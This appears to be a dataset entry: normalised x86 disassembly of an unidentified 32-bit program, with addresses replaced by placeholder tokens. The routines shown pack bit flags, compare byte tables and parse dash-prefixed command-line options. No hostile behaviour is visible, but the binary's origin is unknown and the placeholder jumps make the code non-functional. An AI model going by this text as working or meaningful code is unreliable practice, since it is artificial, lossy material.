mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x40
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x20
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x10
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x8
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x4
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x2
je r-xdata
mov [ eax + rwxdata ] dl
add eax ecx
mov [ rwxdata ] eax
retn
mov [ eax + rwxdata ] cl
add eax ecx
mov [ rwxdata ] eax
retn
add eax ecx
test cl bl
je r-xdata
sub_403990
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
push r--data
push rwxdata
mov edi ecx
mov esi edx
call sub_405ba3
add esp 0x8
mov [ rwxdata ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_405894
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push ebx
push 0x0
push ecx
push eax
call sub_406055
mov edx [ rwxdata ]
push edx
mov [ rwxdata ] 0x0
call sub_4062a6
mov ebx eax
mov eax [ rwxdata ]
push eax
call sub_405a5c
add esp 0x14
test eax eax
jne r-xdata
mov ecx [ rwxdata ]
push ecx
call sub_40613e
mov edx [ rwxdata ]
xor ecx ecx
add esp 0x4
xor eax eax
mov [ rwxdata ] ecx
test edx edx
jle r-xdata
lea esp [ esp ]
push r--data
push rwxdata
call sub_405ba3
add esp 0x8
mov [ rwxdata ] eax
test eax eax
je r-xdata
nop
mov edx [ rwxdata ]
push edx
call sub_4062a6
mov ebx eax
mov eax [ rwxdata ]
push eax
call sub_405a5c
add esp 0x8
test eax eax
je r-xdata
pop ebx
mov edx [ ebp + 0x14 ]
push 0x0
push edx
push eax
call sub_406055
mov eax [ rwxdata ]
push eax
mov [ rwxdata ] 0x0
call sub_4062a6
mov ecx [ rwxdata ]
push ecx
mov ebx eax
call sub_405a5c
add esp 0x14
test eax eax
jne r-xdata
cmp [ eax + rwxdata ] 0x0
je r-xdata
mov esi 0x1000
mov [ ebp - 0x20 ] esi
call sub_4038c0
mov ecx [ rwxdata ]
push ecx
call sub_405f66
add esp 0x4
cmp eax esi
je r-xdata
mov edx [ rwxdata ]
push edx
call sub_40613e
xor eax eax
add esp 0x4
cmp [ rwxdata ] al
je r-xdata
mov edi edi
cmp [ eax + rwxdata ] 0x0
je r-xdata
or esi 0x800
mov [ ebp - 0x20 ] esi
cmp [ rwxdata ] 0x0
je r-xdata
mov eax 0x2
mov eax [ rwxdata ]
push eax
call sub_4062a6
mov ecx [ rwxdata ]
push ecx
mov ebx eax
call sub_405a5c
add esp 0x8
test eax eax
je r-xdata
cmp [ eax + rwxdata ] 0x0
je r-xdata
or esi 0x400
mov [ ebp - 0x20 ] esi
inc eax
mov [ ebp - 0x38 ] eax
xor eax eax
cmp [ rwxdata ] al
je r-xdata
or eax 0x1
call sub_4038c0
mov edx [ rwxdata ]
push edx
call sub_405f66
add esp 0x4
cmp eax edi
je r-xdata
cmp [ eax + rwxdata ] 0x0
je r-xdata
or esi 0x200
mov [ ebp - 0x20 ] esi
cmp [ rwxdata ] 0x0
je r-xdata
mov eax 0x2
cmp [ eax + rwxdata ] 0x0
je r-xdata
or esi 0x100
mov [ ebp - 0x20 ] esi
inc eax
xor edx edx
mov [ ebp - 0x34 ] eax
cmp [ rwxdata ] dl
je r-xdata
or eax 0x1
cmp [ eax + rwxdata ] 0x0
je r-xdata
or esi 0x80
mov [ ebp - 0x20 ] esi
cmp [ rwxdata ] 0x0
je r-xdata
mov edx 0x2
cmp [ eax + rwxdata ] 0x0
je r-xdata
or esi 0x40
mov [ ebp - 0x20 ] esi
inc edx
xor ecx ecx
mov [ ebp - 0x30 ] edx
cmp [ rwxdata ] cl
je r-xdata
or edx 0x1
cmp [ eax + rwxdata ] 0x0
je r-xdata
or esi 0x20
mov [ ebp - 0x20 ] esi
cmp [ rwxdata ] 0x0
je r-xdata
mov ecx 0x2
cmp [ eax + rwxdata ] 0x0
je r-xdata
or esi 0x10
mov [ ebp - 0x20 ] esi
inc ecx
xor edi edi
cmp [ rwxdata ] 0x0
mov [ ebp - 0x2c ] ecx
je r-xdata
or ecx 0x1
cmp [ eax + rwxdata ] 0x0
je r-xdata
or esi 0x8
mov [ ebp - 0x20 ] esi
cmp [ rwxdata ] 0x0
je r-xdata
mov edi 0x2
cmp [ eax + rwxdata ] 0x0
je r-xdata
or esi 0x4
mov [ ebp - 0x20 ] esi
movzx eax [ rwxdata ]
mov [ ebp - 0x18 ] al
movzx eax [ rwxdata ]
mov [ ebp - 0x17 ] al
movzx eax [ rwxdata ]
mov [ ebp - 0x16 ] al
movzx eax [ rwxdata ]
mov [ ebp - 0x15 ] al
movzx eax [ rwxdata ]
mov [ ebp - 0x14 ] al
movzx eax [ rwxdata ]
mov [ ebp - 0x13 ] al
movzx eax [ rwxdata ]
mov [ ebp - 0x12 ] al
movzx eax [ rwxdata ]
mov [ ebp - 0x11 ] al
movzx eax [ rwxdata ]
mov [ ebp - 0x10 ] al
movzx eax [ rwxdata ]
mov [ ebp - 0xf ] al
movzx eax [ rwxdata ]
mov [ ebp - 0xe ] al
movzx eax [ rwxdata ]
mov [ ebp - 0xd ] al
movzx eax [ rwxdata ]
mov [ ebp - 0xc ] al
movzx eax [ rwxdata ]
mov [ ebp - 0xb ] al
movzx eax [ rwxdata ]
mov [ ebp - 0xa ] al
movzx eax [ rwxdata ]
mov [ ebp - 0x9 ] al
movzx eax [ rwxdata ]
mov [ ebp - 0x8 ] al
movzx eax [ rwxdata ]
mov [ ebp - 0x7 ] al
movzx eax [ rwxdata ]
mov [ ebp - 0x6 ] al
movzx eax [ rwxdata ]
mov esi 0x24
inc edi
mov [ ebp - 0x5 ] al
mov [ rwxdata ] 0x0
cmp [ rwxdata ] esi
jle r-xdata
or edi 0x1
cmp [ eax + rwxdata ] 0x0
je r-xdata
or esi 0x2
mov [ ebp - 0x20 ] esi
push r--data
push rwxdata
call sub_405ba3
add esp 0x8
mov [ rwxdata ] eax
test eax eax
je r-xdata
xor eax eax
test edi edi
jle r-xdata
mov esi [ esi * 4 + rwxdata ]
add eax 0xd
mov [ ecx * 4 + rwxdata ] esi
inc ecx
cmp eax edx
jl r-xdata
or esi 0x1
mov [ ebp - 0x20 ] esi
mov edx [ ebp + 0xc ]
xor esi esi
push esi
push edx
push eax
call sub_406055
mov eax [ rwxdata ]
push eax
mov [ rwxdata ] esi
call sub_4062a6
mov ecx [ rwxdata ]
push ecx
mov ebx eax
call sub_405a5c
add esp 0x14
test eax eax
jne r-xdata
cmp eax edi
jne r-xdata
lea esp [ esp ]
xor esi esi
cmp [ eax + rwxdata ] 0x0
mov [ ebp - 0x20 ] esi
je r-xdata
mov [ rwxdata ] ecx
mov edx [ rwxdata ]
push edx
call sub_40613e
add esp 0x4
cmp [ rwxdata ] 0x0
mov [ ebp - 0x1c ] esi
je r-xdata
mov esi [ ebp + 0x10 ]
lea ecx [ ecx ]
xor eax eax
cmp eax [ ebp - 0x38 ]
jge r-xdata
add esi edi
xor ebx ebx
cmp [ esi + rwxdata ] bl
je r-xdata
inc eax
cmp eax edi
jl r-xdata
cmp [ rwxdata ] 0x0
je r-xdata
mov [ ebp - 0x1c ] 0x1000
xor esi esi
mov eax [ rwxdata ]
push eax
call sub_4062a6
mov ecx [ rwxdata ]
push ecx
mov ebx eax
call sub_405a5c
add esp 0x8
test eax eax
je r-xdata
jne r-xdata
lea ebx [ ebx ]
cmp [ esi + rwxdata ] 0x0
je r-xdata
mov ebx 0x8
mov bl [ esi + eax + rwxdata ]
cmp bl [ ebp + eax - 0x8 ]
jne r-xdata
cmp [ rwxdata ] 0x0
je r-xdata
or [ ebp - 0x1c ] 0x800
call sub_4038c0
mov edx [ rwxdata ]
push edx
call sub_405f66
add esp 0x4
cmp eax esi
je r-xdata
xor eax eax
cmp eax [ ebp - 0x34 ]
jge r-xdata
add esi [ ebp - 0x38 ]
mov ebx 0x10
cmp [ esi + rwxdata ] 0x0
je r-xdata
cmp eax [ ebp - 0x38 ]
inc eax
cmp eax [ ebp - 0x38 ]
jl r-xdata
cmp [ esi + rwxdata ] 0x0
je r-xdata
or ebx 0x4
cmp [ rwxdata ] 0x0
je r-xdata
or [ ebp - 0x1c ] 0x400
jne r-xdata
mov bl [ esi + eax + rwxdata ]
cmp bl [ ebp + eax - 0x14 ]
jne r-xdata
cmp [ esi + rwxdata ] 0x0
je r-xdata
mov ebx 0x18
mov bl [ esi + eax + rwxdata ]
cmp bl [ ebp + eax - 0x18 ]
jne r-xdata
cmp [ esi + rwxdata ] 0x0
je r-xdata
or ebx 0x2
cmp [ rwxdata ] 0x0
je r-xdata
or [ ebp - 0x1c ] 0x200
xor eax eax
test edx edx
jle r-xdata
add esi [ ebp - 0x34 ]
mov ebx 0x20
cmp [ esi + rwxdata ] 0x0
je r-xdata
cmp eax [ ebp - 0x34 ]
inc eax
cmp eax [ ebp - 0x34 ]
jl r-xdata
cmp [ esi + rwxdata ] 0x0
je r-xdata
or ebx 0x4
add esi 0x4
or ebx 0x1
cmp [ rwxdata ] 0x0
je r-xdata
or [ ebp - 0x1c ] 0x100
cmp eax edx
jne r-xdata
lea ecx [ ecx ]
cmp [ esi + rwxdata ] 0x0
je r-xdata
mov ebx 0x30
cmp [ esi + rwxdata ] 0x0
je r-xdata
or ebx 0x2
mov eax [ rwxdata ]
mov ecx [ ebp - 0x2c ]
mov edx [ ebp - 0x30 ]
mov [ eax * 4 + rwxdata ] ebx
inc eax
mov [ rwxdata ] eax
mov ecx [ rwxdata ]
push ebx
push r--data
lea edx [ ecx + rwxdata ]
push edx
jmp r-xdata
cmp [ rwxdata ] 0x0
je r-xdata
or [ ebp - 0x1c ] 0x80
xor eax eax
test ecx ecx
jle r-xdata
add esi [ ebp - 0x30 ]
mov ebx 0x40
cmp [ esi + rwxdata ] 0x0
je r-xdata
inc eax
cmp eax edx
jl r-xdata
cmp [ esi + rwxdata ] 0x0
je r-xdata
or ebx 0x8
add esi 0x4
jmp r-xdata
or ebx 0x1
call sub_4058a3
add esp 0xc
add [ rwxdata ] eax
cmp [ rwxdata ] 0x0
je r-xdata
or [ ebp - 0x1c ] 0x40
cmp eax ecx
jne r-xdata
jmp r-xdata
cmp [ esi + rwxdata ] 0x0
je r-xdata
mov ebx 0x60
mov bl [ esi + eax + rwxdata ]
cmp bl [ ebp + eax - 0x10 ]
jne r-xdata
cmp [ esi + rwxdata ] 0x0
je r-xdata
or ebx 0x4
cmp [ rwxdata ] 0x0
je r-xdata
cmp [ rwxdata ] 0x0
je r-xdata
or [ ebp - 0x1c ] 0x20
cmp esi [ rwxdata ]
jl r-xdata
add esi [ ebp - 0x2c ]
mov ebx 0x80
cmp [ esi + rwxdata ] 0x0
je r-xdata
mov bl [ esi + eax + rwxdata ]
cmp bl [ ebp + eax - 0xc ]
jne r-xdata
cmp [ esi + rwxdata ] 0x0
je r-xdata
or ebx 0x10
cmp [ esi + rwxdata ] 0x0
je r-xdata
or ebx 0x2
mov eax [ rwxdata ]
push ebx
push r--data
lea ecx [ eax + rwxdata ]
push ecx
cmp [ rwxdata ] 0x0
je r-xdata
or [ ebp - 0x1c ] 0x10
cmp [ esi + rwxdata ] 0x0
je r-xdata
mov ebx 0xc0
inc eax
cmp eax ecx
jl r-xdata
cmp [ esi + rwxdata ] 0x0
je r-xdata
or ebx 0x8
add esi 0x5
cmp [ rwxdata ] 0x0
je r-xdata
or ebx 0x1
cmp [ rwxdata ] 0x0
je r-xdata
or [ ebp - 0x1c ] 0x8
cmp [ esi + rwxdata ] 0x0
je r-xdata
or ebx 0x20
cmp [ esi + rwxdata ] 0x0
je r-xdata
or ebx 0x4
mov edx [ rwxdata ]
push ebx
push r--data
lea eax [ edx + rwxdata ]
push eax
jmp r-xdata
cmp [ rwxdata ] 0x0
je r-xdata
or [ ebp - 0x1c ] 0x4
cmp [ esi + rwxdata ] 0x0
je r-xdata
or ebx 0x10
cmp [ esi + rwxdata ] 0x0
je r-xdata
or ebx 0x2
cmp [ rwxdata ] 0x0
je r-xdata
or [ ebp - 0x1c ] 0x2
cmp [ esi + rwxdata ] 0x0
je r-xdata
or ebx 0x8
add esi 0x6
jmp r-xdata
or ebx 0x1
xor eax eax
cmp [ rwxdata ] al
je r-xdata
or [ ebp - 0x1c ] 0x1
cmp [ esi + rwxdata ] 0x0
je r-xdata
or ebx 0x4
cmp [ rwxdata ] 0x0
je r-xdata
cmp [ rwxdata ] 0x0
je r-xdata
mov eax 0x8
cmp [ esi + rwxdata ] 0x0
je r-xdata
or ebx 0x2
cmp [ rwxdata ] 0x0
je r-xdata
or eax 0x4
add esi 0x7
or ebx 0x1
cmp [ rwxdata ] 0x0
je r-xdata
or eax 0x2
mov [ rwxdata ] esi
mov [ ebp - 0x24 ] esi
inc eax
mov esi 0x11
mov [ ebp - 0x3c ] eax
cmp [ rwxdata ] esi
jle r-xdata
or eax 0x1
mov ecx [ rwxdata ]
xor ebx ebx
xor esi esi
test ecx ecx
jle r-xdata
mov edi [ ebp - 0x20 ]
jmp r-xdata
mov edx [ rwxdata ]
lea eax [ edx + rwxdata ]
push r--data
push eax
call sub_4058a3
add esp 0x8
mov edi [ ebp - 0x1c ]
nop
mov eax esi
cdq
and edx 0x7
add eax edx
sar eax 0x3
cmp eax [ ebp - 0x1c ]
jge r-xdata
xor eax eax
cmp [ esi + rwxdata ] al
je r-xdata
cmp [ esi + rwxdata ] 0x0
jne r-xdata
dec ecx
cmp esi ecx
je r-xdata
mov eax 0x80
mov edx [ ebp - 0x24 ]
mov eax [ edx * 4 + rwxdata ]
mov eax [ eax * 4 + rwxdata ]
mov edx [ rwxdata ]
inc esi
xor ecx ecx
mov eax [ ebp - 0x3c ]
inc esi
cmp eax 0x3
jne r-xdata
push eax
mov eax [ rwxdata ]
push r--data
lea ecx [ eax + rwxdata ]
push ecx
inc esi
cmp [ esi + rwxdata ] 0x0
je r-xdata
mov [ edx + rwxdata ] 0x0
mov [ edx + rwxdata ] 0x1
jmp r-xdata
cmp eax 0x4
jne r-xdata
xor edi edi
jmp r-xdata
cmp esi ecx
je r-xdata
or eax 0x40
mov ebx eax
shl ebx cl
test ebx 0x8000
je r-xdata
inc [ ebp - 0x24 ]
mov [ rwxdata ] edx
cmp esi [ rwxdata ]
jl r-xdata
inc ecx
inc edx
cmp ecx 0xf
jle r-xdata
cmp eax 0x5
jne r-xdata
xor edi edi
cmp [ esi + rwxdata ] 0x0
je r-xdata
cmp [ esi + rwxdata ] 0x0
je r-xdata
mov edx [ rwxdata ]
push eax
push r--data
lea eax [ edx + rwxdata ]
push eax
jmp r-xdata
inc esi
cmp [ esi + rwxdata ] 0x0
je r-xdata
cmp eax 0x6
jne r-xdata
xor edi edi
cmp [ esi + rwxdata ] 0x0
je r-xdata
cmp [ esi + rwxdata ] 0x0
je r-xdata
cmp [ esi + rwxdata ] 0x0
je r-xdata
mov edi 0x4
call sub_4058a3
add esp 0xc
add [ rwxdata ] eax
cmp esi ecx
je r-xdata
or eax 0x20
cmp eax 0x7
jne r-xdata
xor edi edi
cmp [ esi + rwxdata ] 0x0
je r-xdata
cmp [ esi + rwxdata ] 0x0
je r-xdata
cmp [ esi + rwxdata ] 0x0
je r-xdata
lea edi [ eax + 0x4 ]
cmp [ esi + rwxdata ] 0x0
je r-xdata
or edi 0x2
mov ecx [ rwxdata ]
push eax
push r--data
lea edx [ ecx + rwxdata ]
push edx
jmp r-xdata
inc esi
cmp [ esi + rwxdata ] 0x0
je r-xdata
cmp eax 0x8
jne r-xdata
xor edi edi
cmp [ esi + rwxdata ] 0x0
je r-xdata
cmp [ esi + rwxdata ] 0x0
je r-xdata
cmp [ esi + rwxdata ] 0x0
je r-xdata
lea edi [ eax + 0xb ]
cmp [ esi + rwxdata ] 0x0
je r-xdata
or edi 0x4
add esi 0x4
jmp r-xdata
or edi 0x1
cmp esi ecx
je r-xdata
or eax 0x10
cmp eax 0x9
jne r-xdata
xor edi edi
cmp [ esi + rwxdata ] 0x0
je r-xdata
cmp [ esi + rwxdata ] 0x0
je r-xdata
cmp [ esi + rwxdata ] 0x0
je r-xdata
lea edi [ eax + 0x1a ]
cmp [ esi + rwxdata ] 0x0
je r-xdata
or edi 0x8
cmp [ esi + rwxdata ] 0x0
je r-xdata
or edi 0x2
add edi edi
add edi edi
add edi edi
lea eax [ edi + esi ]
cmp esi eax
jge r-xdata
inc esi
cmp [ esi + rwxdata ] 0x0
je r-xdata
xor edi edi
cmp [ esi + rwxdata ] 0x0
jne r-xdata
cmp [ esi + rwxdata ] 0x0
je r-xdata
cmp [ esi + rwxdata ] 0x0
je r-xdata
lea edi [ eax + 0x39 ]
cmp [ esi + rwxdata ] 0x0
je r-xdata
or edi 0x10
cmp [ esi + rwxdata ] 0x0
je r-xdata
or edi 0x4
add esi 0x5
jmp r-xdata
or edi 0x1
mov eax [ ebp - 0x24 ]
mov ecx [ eax * 4 + rwxdata ]
mov eax [ ecx * 4 + rwxdata ]
mov edx [ rwxdata ]
xor ecx ecx
mov ecx [ rwxdata ]
sub eax esi
mov ebx eax
lea edx [ esi + rwxdata ]
push ebx
lea ecx [ ecx + rwxdata ]
push edx
push ecx
call sub_4090d0
add [ rwxdata ] ebx
add esp 0xc
add esi ebx
cmp esi ecx
je r-xdata
or eax 0x8
cmp [ esi + rwxdata ] 0x0
je r-xdata
cmp [ esi + rwxdata ] 0x0
je r-xdata
lea edi [ eax + 0x78 ]
cmp [ esi + rwxdata ] 0x0
je r-xdata
or edi 0x20
cmp [ esi + rwxdata ] 0x0
je r-xdata
or edi 0x8
cmp [ esi + rwxdata ] 0x0
je r-xdata
or edi 0x2
mov [ edx + rwxdata ] 0x0
mov [ edx + rwxdata ] 0x1
jmp r-xdata
inc esi
cmp [ esi + rwxdata ] 0x0
je r-xdata
cmp [ esi + rwxdata ] 0x0
je r-xdata
mov edi 0x100
cmp [ esi + rwxdata ] 0x0
je r-xdata
or edi 0x40
cmp [ esi + rwxdata ] 0x0
je r-xdata
or edi 0x10
cmp [ esi + rwxdata ] 0x0
je r-xdata
or edi 0x4
add esi 0x6
jmp r-xdata
or edi 0x1
mov ebx eax
shl ebx cl
test ebx 0x8000
je r-xdata
jmp r-xdata
inc ecx
inc edx
cmp ecx 0xf
jle r-xdata
cmp esi ecx
je r-xdata
or eax 0x4
cmp [ esi + rwxdata ] 0x0
je r-xdata
or edi 0x80
cmp [ esi + rwxdata ] 0x0
je r-xdata
or edi 0x20
cmp [ esi + rwxdata ] 0x0
je r-xdata
or edi 0x8
cmp [ esi + rwxdata ] 0x0
je r-xdata
or edi 0x2
inc esi
cmp [ esi + rwxdata ] 0x0
je r-xdata
cmp [ esi + rwxdata ] 0x0
je r-xdata
or edi 0x40
cmp [ esi + rwxdata ] 0x0
je r-xdata
or edi 0x10
cmp [ esi + rwxdata ] 0x0
je r-xdata
or edi 0x4
add esi 0x7
jmp r-xdata
or edi 0x1
cmp esi ecx
je r-xdata
or eax 0x2
cmp [ esi + rwxdata ] 0x0
je r-xdata
or edi 0x20
cmp [ esi + rwxdata ] 0x0
je r-xdata
or edi 0x8
cmp [ esi + rwxdata ] 0x0
je r-xdata
or edi 0x2
cmp [ esi + rwxdata ] 0x0
je r-xdata
cmp [ esi + rwxdata ] 0x0
je r-xdata
or edi 0x10
cmp [ esi + rwxdata ] 0x0
je r-xdata
or edi 0x4
add esi 0x8
jmp r-xdata
or edi 0x1
mov ecx [ rwxdata ]
push eax
lea edx [ ecx + rwxdata ]
push r--data
push edx
add esi 0x2
inc ebx
call sub_4058a3
mov ecx [ rwxdata ]
add [ rwxdata ] eax
add esp 0xc
cmp esi ecx
jl r-xdata
or eax 0x1
cmp [ esi + rwxdata ] 0x0
je r-xdata
or edi 0x8
cmp [ esi + rwxdata ] 0x0
je r-xdata
or edi 0x2
cmp ebx edi
jge r-xdata
jmp r-xdata
cmp [ esi + rwxdata ] 0x0
je r-xdata
or edi 0x4
add esi 0x9
jmp r-xdata
or edi 0x1
cmp [ esi + rwxdata ] 0x0
je r-xdata
or edi 0x2
add esi 0xa
or edi 0x1
sub_4046f0
push ebp
mov ebp esp
sub esp 0x14
push r--data
push rwxdata
call sub_405ba3
add esp 0x8
mov [ rwxdata ] eax
test eax eax
je r-xdata
xor eax eax
mov esp ebp
pop ebp
retn
push ebx
push eax
call sub_4062a6
mov ebx eax
mov eax [ rwxdata ]
push eax
call sub_405a5c
add esp 0x8
test eax eax
jne r-xdata
mov eax [ rwxdata ]
push esi
push eax
call sub_40613e
mov esi [ rwxdata ]
xor edx edx
add esp 0x4
xor eax eax
mov [ rwxdata ] edx
test esi esi
jle r-xdata
call sub_4038c0
mov ecx [ rwxdata ]
push ecx
call sub_4062a6
mov edx [ rwxdata ]
push edx
mov ebx eax
call sub_405a5c
add esp 0x8
test eax eax
je r-xdata
push r--data
push rwxdata
call sub_405ba3
add esp 0x8
mov [ rwxdata ] eax
test eax eax
je r-xdata
lea ecx [ ecx ]
pop esi
pop ebx
push edi
push eax
mov [ rwxdata ] 0x0
call sub_405a5c
add esp 0x4
test eax eax
jne r-xdata
cmp [ eax + rwxdata ] 0x0
je r-xdata
mov ecx 0x8000
mov edx [ rwxdata ]
push edx
call sub_40613e
mov eax [ rwxdata ]
dec eax
add esp 0x4
xor edi edi
test eax eax
jle r-xdata
nop
cmp [ eax + rwxdata ] 0x0
je r-xdata
or ecx 0x4000
mov eax rwxdata
lea edx [ eax + 0x1 ]
pop edi
jmp r-xdata
mov esi rwxdata
mov ecx [ rwxdata ]
push ecx
call sub_4062a6
mov edx [ rwxdata ]
push edx
mov esi eax
call sub_4062a6
mov ebx eax
mov eax [ rwxdata ]
push eax
call sub_4062a6
mov ecx [ rwxdata ]
push ecx
mov [ ebp - 0x4 ] eax
call sub_4062a6
mov edx [ rwxdata ]
shl esi 0x8
or esi ebx
shl esi 0x8
or esi [ ebp - 0x4 ]
mov edi eax
shl esi 0x8
push edx
or edi esi
call sub_4062a6
mov esi eax
mov eax [ rwxdata ]
push eax
call sub_4062a6
mov ecx [ rwxdata ]
push ecx
mov [ ebp - 0x8 ] eax
call sub_4062a6
mov edx [ rwxdata ]
push edx
mov [ ebp - 0x4 ] eax
call sub_4062a6
shl esi 0x8
or esi [ ebp - 0x8 ]
mov ebx eax
mov eax [ rwxdata ]
shl esi 0x8
or esi [ ebp - 0x4 ]
push eax
shl esi 0x8
or ebx esi
call sub_4062a6
mov ecx [ rwxdata ]
push ecx
mov esi eax
call sub_4062a6
mov edx [ rwxdata ]
push edx
mov [ ebp - 0x8 ] eax
call sub_4062a6
mov [ ebp - 0x4 ] eax
mov eax [ rwxdata ]
push eax
call sub_4062a6
mov ecx [ rwxdata ]
shl esi 0x8
or esi [ ebp - 0x8 ]
push ecx
shl esi 0x8
or esi [ ebp - 0x4 ]
shl esi 0x8
or eax esi
mov [ ebp - 0xc ] eax
call sub_4062a6
mov edx [ rwxdata ]
push edx
mov esi eax
call sub_4062a6
mov [ ebp - 0x8 ] eax
mov eax [ rwxdata ]
push eax
call sub_4062a6
mov ecx [ rwxdata ]
push ecx
mov [ ebp - 0x4 ] eax
call sub_4062a6
mov edx [ rwxdata ]
shl esi 0x8
or esi [ ebp - 0x8 ]
add esp 0x40
shl esi 0x8
or esi [ ebp - 0x4 ]
push edx
shl esi 0x8
or eax esi
mov [ ebp - 0x14 ] eax
call sub_4062a6
mov esi eax
mov eax [ rwxdata ]
push eax
call sub_4062a6
mov ecx [ rwxdata ]
push ecx
mov [ ebp - 0x8 ] eax
call sub_4062a6
mov edx [ rwxdata ]
push edx
mov [ ebp - 0x4 ] eax
call sub_4062a6
shl esi 0x8
or esi [ ebp - 0x8 ]
shl esi 0x8
or esi [ ebp - 0x4 ]
shl esi 0x8
or eax esi
mov [ ebp - 0x10 ] eax
mov eax [ rwxdata ]
push eax
call sub_4062a6
mov ecx [ rwxdata ]
push ecx
mov esi eax
call sub_4062a6
mov edx [ rwxdata ]
push edx
mov [ ebp - 0x8 ] eax
call sub_4062a6
mov [ ebp - 0x4 ] eax
mov eax [ rwxdata ]
push eax
call sub_4062a6
mov edx [ rwxdata ]
shl esi 0x8
or esi [ ebp - 0x8 ]
lea ecx [ edx + edx * 2 ]
shl esi 0x8
or esi [ ebp - 0x4 ]
add ecx ecx
shl esi 0x8
or eax esi
mov esi [ ebp - 0xc ]
add ecx ecx
add ecx ecx
mov [ ecx + rwxdata ] edi
mov [ ecx + rwxdata ] esi
mov esi [ ebp - 0x10 ]
mov [ ecx + rwxdata ] esi
mov esi [ ebp - 0x14 ]
mov [ ecx + rwxdata ] ebx
mov [ ecx + rwxdata ] esi
mov [ ecx + rwxdata ] eax
mov ecx [ rwxdata ]
inc edx
push ecx
mov [ rwxdata ] edx
call sub_405a5c
add esp 0x24
test eax eax
je r-xdata
cmp [ eax + rwxdata ] 0x0
je r-xdata
or ecx 0x2000
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ esi ]
mov edx [ esi + 0x8 ]
mov eax [ esi - 0x4 ]
push ecx
mov ecx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x10 ]
push eax
push ecx
mov ecx [ esi + 0xc ]
call sub_403990
mov edx [ rwxdata ]
inc edi
dec edx
add esp 0x10
add esi 0x18
cmp edi edx
jl r-xdata
cmp [ eax + rwxdata ] 0x0
je r-xdata
or ecx 0x1000
sub eax edx
push eax
call sub_401120
add esp 0x4
cmp [ eax + rwxdata ] 0x0
je r-xdata
or ecx 0x800
cmp [ eax + rwxdata ] 0x0
je r-xdata
or ecx 0x400
cmp [ eax + rwxdata ] 0x0
je r-xdata
or ecx 0x200
cmp [ eax + rwxdata ] 0x0
je r-xdata
or ecx 0x100
cmp [ eax + rwxdata ] 0x0
je r-xdata
or ecx 0x80
cmp [ eax + rwxdata ] 0x0
je r-xdata
or ecx 0x40
cmp [ eax + rwxdata ] 0x0
je r-xdata
or ecx 0x20
cmp [ eax + rwxdata ] 0x0
je r-xdata
or ecx 0x10
cmp [ eax + rwxdata ] 0x0
je r-xdata
or ecx 0x8
cmp [ eax + rwxdata ] 0x0
je r-xdata
or ecx 0x4
cmp [ eax + rwxdata ] 0x0
je r-xdata
or ecx 0x2
add eax 0x10
mov [ edx * 4 + rwxdata ] ecx
inc edx
cmp eax esi
jl r-xdata
or ecx 0x1
xor ecx ecx
cmp [ eax + rwxdata ] cl
je r-xdata
mov [ rwxdata ] edx
sub_404b40
push ebp
mov ebp esp
sub esp 0x110
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
push 0xff
lea eax [ ebp - 0x104 ]
push 0x0
push eax
call sub_40c890
push 0xc
call sub_40642f
add esp 0x10
mov [ ebp - 0x10c ] eax
mov [ eax + 0x4 ] r--data
mov [ eax + 0x8 ] r--data
mov edi 0x1
mov bl 0x2d
mov edi edi
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
je r-xdata
inc edi
cmp edi 0x3
jl r-xdata
lea edx [ ebp - 0x104 ]
sub edx eax
mov ecx [ ebp - 0x10c ]
mov eax [ ecx + edi * 4 ]
mov ecx eax
lea esi [ ecx + 0x1 ]
mov edi edi
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_405894
mov esp ebp
pop ebp
retn
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
cmp [ ebp - 0x104 ] bl
jne r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
cmp eax 0x2
jne r-xdata
mov al [ ebp - 0x103 ]
cmp al 0x63
jne r-xdata
cmp al 0x64
je r-xdata
lea edx [ edi + 0x1 ]
cmp edx 0x3
jge r-xdata
lea edx [ edi + 0x1 ]
mov [ ebp - 0x108 ] edi
cmp edx 0x3
jge r-xdata
cmp al 0x68
je r-xdata
mov esi [ ebp - 0x10c ]
mov eax [ esi + edi * 4 + 0x4 ]
lea edx [ eax + 0x1 ]
nop
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_405894
mov esp ebp
pop ebp
retn
mov ebx [ ebp - 0x10c ]
mov ecx [ ebx + edi * 4 + 0x4 ]
mov eax ecx
lea esi [ eax + 0x1 ]
cmp al 0x6c
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax esi
je r-xdata
cmp al 0x65
je r-xdata
mov ecx [ esi + edi * 4 + 0x4 ]
mov [ ebp - 0x108 ] edi
mov edx rwxdata
mov edi edi
mov edx rwxdata
mov al [ ecx ]
mov [ edx ] al
inc ecx
inc edx
test al al
jne r-xdata
push 0xff
lea eax [ ebp - 0x104 ]
push 0x0
push eax
call sub_40c890
mov eax [ esi + edi * 4 + 0x4 ]
lea edx [ ebp - 0x104 ]
add esp 0xc
sub edx eax
lea esp [ esp ]
